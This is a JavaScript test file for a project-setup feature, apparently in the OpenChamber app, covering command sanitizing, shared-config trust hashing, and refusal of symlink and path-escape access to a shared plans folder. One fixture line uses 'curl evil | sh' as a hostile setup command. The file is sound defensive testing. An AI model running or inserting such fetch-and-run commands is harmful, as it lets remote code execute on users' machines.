import { describe, expect, it } from 'vitest';
import express from 'express';
import request from 'supertest';
import { once } from 'node:events';
import os from 'os';
import path from 'path';
import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from 'fs/promises';

import { createProjectContextRuntime } from '../project-context/runtime.js';
import { registerProjectContextRoutes } from '../project-context/routes.js';
import { registerProjectSetupRoutes } from './routes.js';

import { createProjectConfigRuntime } from './project-config.js';
import { createProjectIdFromPath, projectPathFromId } from './project-id.js';
import {
  applySharedProjectSetupPatch,
  isSharedProjectConfigEmpty,
  mergeProjectSetup,
  normalizePlansDir,
  serializeSharedProjectConfig,
  parseSharedProjectConfig,
  sharedTrustHashOf,
  projectSetupPatchToStored,
  projectSetupViewOf,
  sanitizeDraftStarters,
  sanitizeProjectActions,
  sanitizeSetupCommands,
} from './project-setup.js';

const emptyPersonal = {
  setupWorktree: [],
  setupWorktreeWait: null,
  setupWorktreeMode: 'append',
  projectActions: [],
  projectActionsPrimaryId: null,
  draftStarters: [],
  hiddenSharedActionIds: [],
  sharedTrust: null,
};

const createRuntime = async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'oc-project-setup-'));
  const runtime = createProjectConfigRuntime({
    fsPromises: await import('fs/promises'),
    path,
    projectsDirPath: path.join(tempRoot, 'projects'),
    createTaskID: () => 'task-fixed-id',
  });
  return {
    runtime,
    tempRoot,
    readRaw: async (projectId) => JSON.parse(await readFile(path.join(tempRoot, 'projects', `${projectId}.json`), 'utf8')),
    cleanup: () => rm(tempRoot, { recursive: true, force: true }),
  };
};

describe('project setup sanitizers', () => {
  it('keeps only non-empty trimmed setup commands', () => {
    expect(sanitizeSetupCommands([' bun install ', '', 42, '\n'])).toEqual(['bun install']);
    expect(sanitizeSetupCommands('bun install')).toEqual([]);
  });

  it('drops actions without id, name, or command and duplicate ids', () => {
    expect(sanitizeProjectActions([
      { id: 'a', name: 'Dev', command: 'bun run dev' },
      { id: 'a', name: 'Again', command: 'x' },
      { id: '', name: 'No id', command: 'x' },
      { id: 'b', name: '', command: 'x' },
      'not an action',
    ])).toEqual([{ id: 'a', name: 'Dev', command: 'bun run dev', icon: null }]);
  });

  it('keeps only the optional action fields the user set', () => {
    expect(sanitizeProjectActions([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: ' rocket ',
      runIn: 'parent',
      platforms: ['macos', 'MacOS', 'plan9', 'linux'],
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      desktopOpenSshForward: '',
    }])).toEqual([{
      id: 'a',
      name: 'Dev',
      command: 'bun run dev',
      icon: 'rocket',
      autoOpenUrl: true,
      openUrl: 'http://localhost:3000',
      platforms: ['macos', 'linux'],
      runIn: 'parent',
    }]);
  });

  it('treats any runIn other than parent as the worktree default', () => {
    const [worktree, number] = sanitizeProjectActions([
      { id: 'a', name: 'A', command: 'x', runIn: 'worktree' },
      { id: 'b', name: 'B', command: 'x', runIn: 123 },
    ]);
    expect(worktree).not.toHaveProperty('runIn');
    expect(number).not.toHaveProperty('runIn');
  });

  it('dedupes draft starters by type and name', () => {
    expect(sanitizeDraftStarters([
      { type: 'skill', name: 'triage-prs' },
      { type: 'skill', name: 'triage-prs' },
      { type: 'command', name: ' explore ' },
      { type: 'agent', name: 'nope' },
    ])).toEqual([{ type: 'skill', name: 'triage-prs' }, { type: 'command', name: 'explore' }]);
  });

  it('builds the personal view from the on-disk keys and nulls a dangling primary action', () => {
    expect(projectSetupViewOf({
      'setup-worktree': ['bun install'],
      'setup-worktree-wait': true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x' }],
      projectActionsPrimaryId: 'missing',
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev', '', 'dev', 7],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
      scheduledTasks: [{ id: 't' }],
    })).toEqual({
      setupWorktree: ['bun install'],
      setupWorktreeWait: true,
      setupWorktreeMode: 'replace',
      projectActions: [{ id: 'a', name: 'A', command: 'x', icon: null }],
      projectActionsPrimaryId: null,
      draftStarters: [{ type: 'skill', name: 's' }],
      hiddenSharedActionIds: ['dev'],
      sharedTrust: { hash: 'sha256:abc', trustedAt: 5 },
    });
    expect(projectSetupViewOf(null)).toEqual(emptyPersonal);
  });

  it('maps a patch to the stored keys it names and rejects wrong shapes', () => {
    expect(projectSetupPatchToStored({
      setupWorktree: ['a'],
      projectActionsPrimaryId: null,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    })).toEqual({
      'setup-worktree': ['a'],
      projectActionsPrimaryId: undefined,
      hiddenSharedActionIds: ['x'],
      setupWorktreeMode: 'replace',
    });
    expect(projectSetupPatchToStored({})).toEqual({});
    expect(() => projectSetupPatchToStored({ setupWorktree: 'a' })).toThrow('setupWorktree must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
    expect(() => projectSetupPatchToStored({ projectActions: {} })).toThrow('projectActions must be');
    expect(() => projectSetupPatchToStored({ draftStarters: null })).toThrow('draftStarters must be');
    expect(() => projectSetupPatchToStored({ hiddenSharedActionIds: 'dev' })).toThrow('hiddenSharedActionIds must be');
    expect(() => projectSetupPatchToStored({ setupWorktreeMode: 'merge' })).toThrow('setupWorktreeMode must be');
    expect(() => projectSetupPatchToStored({ sharedTrustHash: '' })).toThrow('sharedTrustHash must be');
    expect(projectSetupPatchToStored({ sharedTrustHash: null })).toEqual({ sharedTrust: undefined });
    expect(projectSetupPatchToStored({ sharedTrustHash: 'sha256:x' }).sharedTrust).toMatchObject({ hash: 'sha256:x' });
    expect(() => projectSetupPatchToStored([])).toThrow('patch must be');
  });
});

describe('shared project config', () => {
  it('accepts a relative plansDir inside the repo only', () => {
    expect(normalizePlansDir(' docs/plans/ ')).toBe('docs/plans');
    expect(normalizePlansDir('./.openchamber/plans')).toBe('.openchamber/plans');
    expect(normalizePlansDir('docs\\plans')).toBe('docs/plans');
    expect(normalizePlansDir('/etc')).toBeNull();
    expect(normalizePlansDir('C:/plans')).toBeNull();
    expect(normalizePlansDir('../sibling/plans')).toBeNull();
    expect(normalizePlansDir('docs/../../x')).toBeNull();
    expect(normalizePlansDir('')).toBeNull();
  });

  it('parses a version-1 file and sanitizes its lists', () => {
    expect(parseSharedProjectConfig(JSON.stringify({
      version: 1,
      setupWorktree: ['bun install', ''],
      setupWorktreeWait: true,
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: '', name: 'x', command: 'y' }],
      draftStarters: [{ type: 'skill', name: 's' }],
      plansDir: 'docs/plans',
    }))).toEqual({
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }],
        draftStarters: [{ type: 'skill', name: 's' }],
        plansDir: 'docs/plans',
      },
    });
    expect(parseSharedProjectConfig('{"version":1}')).toEqual({
      status: 'ok',
      config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null },
    });
  });

  it('reports a broken file as invalid with a reason, never as empty', () => {
    expect(parseSharedProjectConfig('{ nope').status).toBe('invalid');
    expect(parseSharedProjectConfig('[]')).toEqual({ status: 'invalid', reason: 'not an object' });
    expect(parseSharedProjectConfig('{"version":2}').reason).toMatch(/unsupported version/);
    expect(parseSharedProjectConfig('{"version":1,"setupWorktree":"bun install"}').reason).toMatch(/setupWorktree must be/);
    expect(parseSharedProjectConfig('{"version":1,"plansDir":"/etc"}').reason).toMatch(/plansDir/);
  });

  it('merges shared and personal by the agreed rules', () => {
    const shared = {
      status: 'ok',
      config: {
        setupWorktree: ['bun install'],
        setupWorktreeWait: true,
        projectActions: [
          { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null },
          { id: 'test', name: 'Test', command: 'bun test', icon: null },
          { id: 'lint', name: 'Lint', command: 'bun lint', icon: null },
        ],
        draftStarters: [{ type: 'skill', name: 'shared-skill' }, { type: 'command', name: 'both' }],
        plansDir: 'docs/plans',
      },
    };
    const personal = {
      ...emptyPersonal,
      setupWorktree: ['cp .env.example .env'],
      projectActions: [{ id: 'test', name: 'My test', command: 'bun test --watch', icon: null }],
      projectActionsPrimaryId: 'test',
      draftStarters: [{ type: 'command', name: 'both' }, { type: 'command', name: 'mine' }],
      hiddenSharedActionIds: ['lint'],
    };

    const merged = mergeProjectSetup(personal, shared);
    expect(merged.setupWorktree).toEqual(['bun install', 'cp .env.example .env']);
    expect(merged.setupWorktreeWait).toBe(true);
    expect(merged.projectActions).toEqual([
      { id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'shared' },
      { id: 'test', name: 'My test', command: 'bun test --watch', icon: null, source: 'personal' },
    ]);
    expect(merged.projectActionsPrimaryId).toBe('test');
    expect(merged.draftStarters).toEqual([
      { type: 'skill', name: 'shared-skill', source: 'shared' },
      { type: 'command', name: 'both', source: 'shared' },
      { type: 'command', name: 'mine', source: 'personal' },
    ]);
    expect(merged.shared).toEqual({ status: 'ok', path: '.openchamber/project.json', ...shared.config });
    expect(merged.personal).toBe(personal);
    expect(merged.trust).toEqual({ hash: sharedTrustHashOf(shared.config), trusted: false });
  });

  it('hashes the executable parts of the shared config, order-independent for actions', () => {
    const base = { setupWorktree: ['bun install'], projectActions: [{ id: 'b', name: 'B', command: 'y', icon: null }, { id: 'a', name: 'A', command: 'x', icon: null }], draftStarters: [], plansDir: null, setupWorktreeWait: null };
    const hash = sharedTrustHashOf(base);
    expect(hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(sharedTrustHashOf({ ...base, projectActions: [...base.projectActions].reverse() })).toBe(hash);
    // Renaming or re-describing does not change what runs; changing a command does.
    expect(sharedTrustHashOf({ ...base, projectActions: base.projectActions.map((a) => ({ ...a, name: 'Renamed', icon: 'rocket' })) })).toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: ['curl evil | sh'] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, projectActions: [{ ...base.projectActions[0], runIn: 'parent' }, base.projectActions[1]] })).not.toBe(hash);
    expect(sharedTrustHashOf({ ...base, setupWorktree: [], projectActions: [] })).toBeNull();
  });

  it('reports trust: nothing to trust without executable shared parts, trusted only for the recorded hash', () => {
    const inert = { status: 'ok', config: { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [{ type: 'skill', name: 's' }], plansDir: null } };
    expect(mergeProjectSetup(emptyPersonal, inert).trust).toEqual({ hash: null, trusted: true });
    expect(mergeProjectSetup(emptyPersonal, { status: 'missing' }).trust).toEqual({ hash: null, trusted: true });

    const risky = { status: 'ok', config: { ...inert.config, setupWorktree: ['bun install'] } };
    const hash = sharedTrustHashOf(risky.config);
    expect(mergeProjectSetup(emptyPersonal, risky).trust).toEqual({ hash, trusted: false });
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash, trustedAt: 1 } }, risky).trust.trusted).toBe(true);
    expect(mergeProjectSetup({ ...emptyPersonal, sharedTrust: { hash: 'sha256:stale', trustedAt: 1 } }, risky).trust.trusted).toBe(false);
  });

  it('lets the personal wait flag and replace mode win over shared', () => {
    const shared = { status: 'ok', config: { setupWorktree: ['bun install'], setupWorktreeWait: true, projectActions: [], draftStarters: [], plansDir: null } };
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'], setupWorktreeWait: false, setupWorktreeMode: 'replace' }, shared);
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.setupWorktreeWait).toBe(false);
  });

  it('carries an invalid shared read through with its reason and merges nothing from it', () => {
    const merged = mergeProjectSetup({ ...emptyPersonal, setupWorktree: ['mine'] }, { status: 'invalid', reason: 'invalid JSON: x' });
    expect(merged.setupWorktree).toEqual(['mine']);
    expect(merged.shared.status).toBe('invalid');
    expect(merged.shared.reason).toBe('invalid JSON: x');
    expect(merged.shared.projectActions).toEqual([]);
  });
});

describe('shared project config writes', () => {
  const empty = { setupWorktree: [], setupWorktreeWait: null, projectActions: [], draftStarters: [], plansDir: null };

  it('applies a patch over the current config and refuses wrong shapes', () => {
    const next = applySharedProjectSetupPatch({ ...empty, setupWorktree: ['old'] }, {
      projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev', source: 'personal', icon: '' }],
      plansDir: './docs/plans/',
    });
    expect(next.setupWorktree).toEqual(['old']);
    expect(next.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null }]);
    expect(next.plansDir).toBe('docs/plans');
    expect(applySharedProjectSetupPatch(next, { plansDir: '' }).plansDir).toBeNull();
    expect(() => applySharedProjectSetupPatch(empty, { plansDir: '/etc' })).toThrow('plansDir must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktree: 'x' })).toThrow('setupWorktree must be');
    expect(() => applySharedProjectSetupPatch(empty, { setupWorktreeWait: 'yes' })).toThrow('setupWorktreeWait must be');
  });

  it('serializes version first, only the keys that carry something, without source marks', () => {
    expect(serializeSharedProjectConfig({ ...empty, projectActions: [{ id: 'dev', name: 'Dev', command: 'x', icon: null, source: 'personal' }], plansDir: 'docs/plans' })).toBe([
      '{',
      '  "version": 1,',
      '  "projectActions": [',
      '    {',
      '      "id": "dev",',
      '      "name": "Dev",',
      '      "command": "x"',
      '    }',
      '  ],',
      '  "plansDir": "docs/plans"',
      '}',
      '',
    ].join('\n'));
    expect(isSharedProjectConfigEmpty(empty)).toBe(true);
    expect(isSharedProjectConfigEmpty({ ...empty, setupWorktreeWait: false })).toBe(false);
  });
});

describe('project id', () => {
  it('round-trips a path through the id', () => {
    const id = createProjectIdFromPath('/Users/me/projects/repo/');
    expect(id.startsWith('path_')).toBe(true);
    expect(projectPathFromId(id)).toBe('/Users/me/projects/repo');
    expect(projectPathFromId('project-test')).toBe('');
    expect(projectPathFromId('path_')).toBe('');
  });
});

describe('shared writes preserve only existing complete-set approval', () => {
  it('metadata saves ask at the real worktree prompt; Skip preserves personal setup and Trust records the complete set', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    const { configureRuntimeUrlResolver } = await import('@openchamber/ui/lib/runtime-url');
    const { updateSharedProjectSetup } = await import('@openchamber/ui/lib/openchamberConfig');
    const {
      resolveWorktreeSetupCommands, settleSharedTrustConfirmation,
      subscribeSharedTrustConfirmation, getSharedTrustConfirmationSnapshot,
    } = await import('@openchamber/ui/lib/sharedTrustConfirmation');
    const app = express();
    app.use(express.json());
    registerProjectSetupRoutes(app, { projectConfigRuntime: runtime });
    const server = app.listen(0, '127.0.0.1');
    await once(server, 'listening');
    const address = server.address();
    configureRuntimeUrlResolver({ apiBaseUrl: `http://127.0.0.1:${address.port}` });
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      const sharedPath = path.join(repo, '.openchamber', 'project.json');
      const sharedRaw = {
        version: 1, setupWorktree: ['echo repository-setup'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'echo repository-action' }],
      };
      await writeFile(sharedPath, JSON.stringify(sharedRaw));
      const projectId = createProjectIdFromPath(repo);
      const project = { id: projectId, path: repo };
      await runtime.updateProjectSetup(projectId, { setupWorktree: ['echo personal-setup'] });
      const originalHash = (await runtime.readProjectSetup(projectId)).trust.hash;
      const choose = async (choice, expectedActions = ['echo repository-action']) => {
        const asked = new Promise((resolve) => {
          const unsubscribe = subscribeSharedTrustConfirmation(() => {
            const prompt = getSharedTrustConfirmationSnapshot();
            if (prompt) { unsubscribe(); resolve(prompt); }
          });
        });
        const pending = resolveWorktreeSetupCommands(project);
        const prompt = await asked;
        expect(prompt.setupCommands).toEqual(['echo repository-setup']);
        expect(prompt.actions.map((action) => action.command)).toEqual(expectedActions);
        settleSharedTrustConfirmation(choice);
        return pending;
      };
      for (const patch of [
        { plansDir: 'docs/plans' },
        { draftStarters: [{ type: 'skill', name: 'triage' }] },
        { draftStarters: [] }, {}, { futureKey: true, sharedTrustHash: originalHash },
      ]) {
        const saved = await updateSharedProjectSetup(project, patch);
        expect(saved.trust).toEqual({ hash: originalHash, trusted: false });
        expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
        expect(saved.shared.setupWorktree).toEqual(sharedRaw.setupWorktree);
        expect(saved.shared.projectActions[0].command).toBe('echo repository-action');
        expect(await choose('skip')).toEqual(['echo personal-setup']);
        expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
      }
      expect(await choose('trust')).toEqual(['echo repository-setup', 'echo personal-setup']);
      const personalRaw = await readRaw(projectId);
      personalRaw.sharedTrust.trustedAt = 17;
      await writeFile(path.join(tempRoot, 'projects', `${projectId}.json`), JSON.stringify(personalRaw));
      const approval = personalRaw.sharedTrust;
      expect(approval.hash).toBe(originalHash);
      for (const patch of [
        { plansDir: 'other/plans' }, { draftStarters: [{ type: 'command', name: 'explore' }] },
        { draftStarters: [] }, { setupWorktreeWait: true },
        { projectActions: [{ id: 'dev', name: 'Renamed', icon: 'rocket', command: 'echo repository-action' }] }, {},
      ]) {
        expect((await updateSharedProjectSetup(project, patch)).trust.trusted).toBe(true);
        expect((await readRaw(projectId)).sharedTrust).toEqual(approval);
        expect(await resolveWorktreeSetupCommands(project)).toEqual(['echo repository-setup', 'echo personal-setup']);
        expect(getSharedTrustConfirmationSnapshot()).toBeNull();
      }
      for (const action of [
        { id: 'dev', name: 'Changed command', command: 'echo new-command' },
        { id: 'dev', name: 'Changed runIn', command: 'echo new-command', runIn: 'parent' },
      ]) {
        // A repository pull, followed by an unrelated metadata save, cannot approve the changed tuple.
        const currentRaw = JSON.parse(await readFile(sharedPath, 'utf8'));
        await writeFile(sharedPath, JSON.stringify({ ...currentRaw, projectActions: [action] }));
        const saved = await updateSharedProjectSetup(project, { plansDir: 'docs/plans' });
        expect(saved.trust.trusted).toBe(false);
        expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
        expect(await choose('skip', ['echo new-command'])).toEqual(['echo personal-setup']);
        expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
        expect(await choose('trust', ['echo new-command'])).toEqual(['echo repository-setup', 'echo personal-setup']);
        expect((await readRaw(projectId)).sharedTrust.hash).toBe(saved.trust.hash);
      }
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      const shared = await updateSharedProjectSetup(project, {
        projectActions: [
          { id: 'dev', name: 'Unseen', command: 'echo new-command', runIn: 'parent' },
          { id: 'mine', name: 'Mine', command: 'echo known-personal' },
        ],
      });
      expect(shared.trust.trusted).toBe(false);
      expect(await choose('skip', ['echo new-command', 'echo known-personal'])).toEqual(['echo personal-setup']);
      expect(await choose('trust', ['echo new-command', 'echo known-personal'])).toEqual(['echo repository-setup', 'echo personal-setup']);
    } finally {
      settleSharedTrustConfirmation('skip');
      configureRuntimeUrlResolver({});
      await new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
      await cleanup();
    }
  });

  it('clears stale command/runIn approval, never trusts command sharing, and serializes shared and personal writes', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      const sharedPath = path.join(repo, '.openchamber', 'project.json');
      const initial = { version: 1, setupWorktree: ['echo unseen'], projectActions: [{ id: 'dev', name: 'Dev', command: 'echo dev' }] };
      await writeFile(sharedPath, JSON.stringify(initial));
      await mkdir(path.join(tempRoot, 'projects'), { recursive: true });
      await writeFile(path.join(tempRoot, 'projects', `${projectId}.json`), JSON.stringify({
        version: 1, scheduledTasks: [{ id: 'keep' }], futureKey: { keep: true },
        'setup-worktree': ['echo personal'], sharedTrust: { hash: 'sha256:stale', trustedAt: 7 },
      }));
      await runtime.updateProjectSetup('other-project', { sharedTrustHash: 'sha256:other' });
      const other = await readRaw('other-project');
      expect((await runtime.updateSharedProjectSetup(projectId, {})).trust.trusted).toBe(false);
      expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
      for (const change of [
        { ...initial, setupWorktree: ['echo changed'] },
        { ...initial, projectActions: [{ ...initial.projectActions[0], runIn: 'parent' }] },
      ]) {
        await writeFile(sharedPath, JSON.stringify(initial));
        const approved = await runtime.updateProjectSetup(projectId, { sharedTrustHash: (await runtime.readProjectSetup(projectId)).trust.hash });
        expect(approved.trust.trusted).toBe(true);
        await writeFile(sharedPath, JSON.stringify(change));
        expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(false);
        const patched = await runtime.updateSharedProjectSetup(projectId, { plansDir: 'docs/plans' });
        expect(patched.trust.trusted).toBe(false);
        expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
        const fresh = await runtime.updateProjectSetup(projectId, { sharedTrustHash: patched.trust.hash });
        expect(fresh.trust.trusted).toBe(true);
      }
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      const shared = await runtime.updateSharedProjectSetup(projectId, {
        projectActions: [...initial.projectActions, { id: 'mine', name: 'Mine', command: 'echo known-personal' }],
      });
      expect(shared.shared.setupWorktree).toEqual(['echo unseen']);
      expect(shared.trust.trusted).toBe(false);
      expect(await readRaw(projectId)).not.toHaveProperty('sharedTrust');
      const hash = shared.trust.hash;
      await runtime.updateProjectSetup(projectId, { sharedTrustHash: hash });
      const approval = (await readRaw(projectId)).sharedTrust;
      await Promise.all([
        runtime.updateSharedProjectSetup(projectId, { plansDir: 'new/plans' }),
        runtime.updateSharedProjectSetup(projectId, { draftStarters: [{ type: 'skill', name: 's' }] }),
        runtime.updateProjectSetup(projectId, { setupWorktree: ['echo personal-updated'] }),
      ]);
      const raw = await readRaw(projectId);
      expect(raw.sharedTrust).toEqual(approval);
      expect(raw.scheduledTasks).toEqual([{ id: 'keep' }]);
      expect(raw.futureKey).toEqual({ keep: true });
      expect(raw['setup-worktree']).toEqual(['echo personal-updated']);
      const current = await runtime.readProjectSetup(projectId);
      expect(current.shared.plansDir).toBe('new/plans');
      expect(current.shared.draftStarters).toEqual([{ type: 'skill', name: 's' }]);
      expect(await readRaw('other-project')).toEqual(other);
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: 'bad' })).rejects.toThrow('setupWorktree must be');
      expect(await readRaw(projectId)).toEqual(raw);
      await rm(path.dirname(sharedPath), { recursive: true });
      await writeFile(path.dirname(sharedPath), 'not a directory');
      const personalPath = path.join(tempRoot, 'projects', `${projectId}.json`);
      const personalBefore = await readFile(personalPath, 'utf8');
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: ['echo never-approved'] })).rejects.toThrow();
      expect(await readFile(personalPath, 'utf8')).toBe(personalBefore);
    } finally {
      await cleanup();
    }
  });
});

describe('production shared-plan disable', () => {
  it('direct shared access cannot create a personal manifest or move an outside sentinel', async () => {
    const { runtime: config, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      const outside = path.join(tempRoot, 'outside');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await mkdir(outside);
      await writeFile(path.join(outside, 'sentinel.md'), '# Outside\n\nUntouched');
      await symlink(outside, path.join(repo, '.openchamber', 'plans'));
      const projectId = createProjectIdFromPath(repo);
      const context = createProjectContextRuntime({
        fsPromises: await import('fs/promises'), path,
        projectsDirPath: path.join(tempRoot, 'projects'),
        resolveSharedPlansDir: (id) => config.resolveSharedPlansDir(id),
      });
      expect((await context.readContext(projectId)).plans).toEqual([]);
      expect(await context.readPlan(projectId, 'shared:sentinel.md')).toBeNull();
      expect(await context.updatePlan(projectId, 'shared:sentinel.md', { raw: '# Overwritten' })).toBeNull();
      expect((await context.deletePlan(projectId, 'shared:sentinel.md')).deleted).toBe(false);
      expect(await context.setPlanPinned(projectId, 'shared:sentinel.md', true)).toBeNull();
      expect(await context.unsharePlan(projectId, 'shared:sentinel.md')).toBeNull();
      await expect(context.sharePlan(projectId, 'shared:sentinel.md')).rejects.toThrow('shared plans folder is required');
      await expect(readFile(context.contextPathFor(projectId), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      expect(await readdir(outside)).toEqual(['sentinel.md']);
      expect(await readFile(path.join(outside, 'sentinel.md'), 'utf8')).toBe('# Outside\n\nUntouched');
    } finally {
      await cleanup();
    }
  });

  it.each(['default', 'configured', 'default-ancestor-link', 'configured-ancestor-link', 'leaf-link', 'dangling-link'])(
    'refuses shared operations without data effects for %s, while personal CRUD works',
    async (layout) => {
      const { runtime: config, tempRoot, cleanup } = await createRuntime();
      try {
        const repo = path.join(tempRoot, 'repo');
        const outside = path.join(tempRoot, 'outside');
        const outsideRaw = '# Outside sentinel\n\nDo not disclose, overwrite or move.\n';
        const outsideFile = path.join(outside, 'sentinel.md');
        await mkdir(outside, { recursive: true });
        await writeFile(outsideFile, outsideRaw);
        await mkdir(path.join(repo, '.openchamber'), { recursive: true });
        const configured = layout.startsWith('configured');
        const relative = configured ? 'docs/plans' : '.openchamber/plans';
        const sharedDir = path.join(repo, relative);
        const sharedConfigPath = path.join(repo, '.openchamber', 'project.json');
        const sharedConfig = JSON.stringify(configured ? { version: 1, plansDir: relative } : { version: 1 });
        await writeFile(sharedConfigPath, sharedConfig);
        if (layout === 'configured-ancestor-link') {
          await mkdir(path.join(outside, 'plans'));
          await writeFile(path.join(outside, 'plans', 'sentinel.md'), outsideRaw);
          await symlink(outside, path.join(repo, 'docs'));
        } else if (layout === 'default-ancestor-link') {
          await symlink(outside, sharedDir);
        } else if (layout === 'dangling-link') {
          await symlink(path.join(outside, 'absent'), sharedDir);
        } else {
          await mkdir(sharedDir, { recursive: true });
          if (layout === 'leaf-link') await symlink(outsideFile, path.join(sharedDir, 'sentinel.md'));
          else await writeFile(path.join(sharedDir, 'sentinel.md'), '# Repository plan\n\nUntouched.\n');
        }
        const projectId = createProjectIdFromPath(repo);
        const projectsDirPath = path.join(tempRoot, 'projects');
        const context = createProjectContextRuntime({
          fsPromises: await import('fs/promises'), path, projectsDirPath,
          resolveSharedPlansDir: (id) => config.resolveSharedPlansDir(id),
        });
        const contextPath = context.contextPathFor(projectId);
        await mkdir(path.dirname(contextPath), { recursive: true });
        const sharedLink = { id: 'moved-plan', file: 'sentinel.md', title: 'Moved', createdAt: 1, shared: true };
        await writeFile(contextPath, JSON.stringify({ version: 2, notes: [], todos: [], plans: [sharedLink] }));
        const personal = await context.createPlan(projectId, { title: 'Personal', body: 'Own content' });
        const personalId = personal.plan.id;
        const before = await readFile(contextPath, 'utf8');
        const sharedFile = path.join(sharedDir, 'sentinel.md');
        const sharedBefore = layout === 'dangling-link' ? null : await readFile(sharedFile, 'utf8');
        const outsideEntries = await readdir(outside);

        expect(await config.resolveSharedPlansDir(projectId)).toBeNull();
        const listed = await context.readContext(projectId);
        expect(listed.sharedPlansDir).toBeNull();
        expect(listed.plans.map((plan) => plan.id)).toEqual([personalId]);
        expect(JSON.stringify(listed)).not.toContain('Outside sentinel');
        for (const planId of ['shared:sentinel.md', 'moved-plan']) {
          expect(await context.readPlan(projectId, planId)).toBeNull();
          expect(await context.updatePlan(projectId, planId, { raw: '# Overwritten' })).toBeNull();
          expect(await context.setPlanPinned(projectId, planId, true)).toBeNull();
          expect((await context.deletePlan(projectId, planId)).deleted).toBe(false);
          expect(await context.unsharePlan(projectId, planId)).toBeNull();
          await expect(context.sharePlan(projectId, planId)).rejects.toThrow('shared plans folder is required');
          expect(await readFile(contextPath, 'utf8')).toBe(before);
        }
        const app = express();
        registerProjectContextRoutes(app, { projectContextRuntime: context });
        for (const planId of ['shared:sentinel.md', 'moved-plan']) {
          const endpoint = `/api/project-context/${projectId}/plans/${encodeURIComponent(planId)}`;
          expect((await request(app).get(endpoint)).status).toBe(404);
          expect((await request(app).put(endpoint).send({ raw: '# Overwritten' })).status).toBe(404);
          expect((await request(app).patch(endpoint).send({ pinned: true })).status).toBe(404);
          expect((await request(app).delete(endpoint)).status).toBe(404);
          expect((await request(app).post(`${endpoint}/unshare`)).status).toBe(404);
          expect((await request(app).post(`${endpoint}/share`)).status).toBe(400);
        }
        await expect(context.sharePlan(projectId, personalId)).rejects.toThrow('shared plans folder is required');
        expect(await readFile(contextPath, 'utf8')).toBe(before);
        expect(await readFile(outsideFile, 'utf8')).toBe(outsideRaw);
        expect(await readdir(outside)).toEqual(outsideEntries);
        expect(await readFile(sharedConfigPath, 'utf8')).toBe(sharedConfig);
        if (sharedBefore !== null) expect(await readFile(sharedFile, 'utf8')).toBe(sharedBefore);
        else await expect(readFile(sharedFile, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
        expect(await readdir(context.plansDirFor(projectId))).toEqual([personal.plan.file]);

        expect((await context.readPlan(projectId, personalId)).body).toBe('Own content');
        expect((await context.updatePlan(projectId, personalId, { raw: '# Edited\n\nStill personal.\n' })).raw).toBe('# Edited\n\nStill personal.\n');
        expect((await context.setPlanPinned(projectId, personalId, true)).plan.pinned).toBe(true);
        const note = await context.createNote(projectId, { body: 'Keep notes' });
        await context.saveTodos(projectId, [{ id: 'todo', text: 'Keep todos', completed: false, createdAt: 1 }]);
        expect((await context.deletePlan(projectId, personalId)).deleted).toBe(true);
        expect(await context.readPlan(projectId, personalId)).toBeNull();
        const retained = JSON.parse(await readFile(contextPath, 'utf8'));
        expect(retained.plans).toEqual([{ ...sharedLink, pinned: false }]);
        expect(retained.notes[0].id).toBe(note.note.id);
        expect(retained.todos[0].text).toBe('Keep todos');
        expect(await readFile(outsideFile, 'utf8')).toBe(outsideRaw);
      } finally {
        await cleanup();
      }
    },
  );
});

describe('project setup runtime', () => {
  it('reads an empty merged view for a project without files', async () => {
    const { runtime, cleanup } = await createRuntime();
    try {
      const view = await runtime.readProjectSetup('project-a');
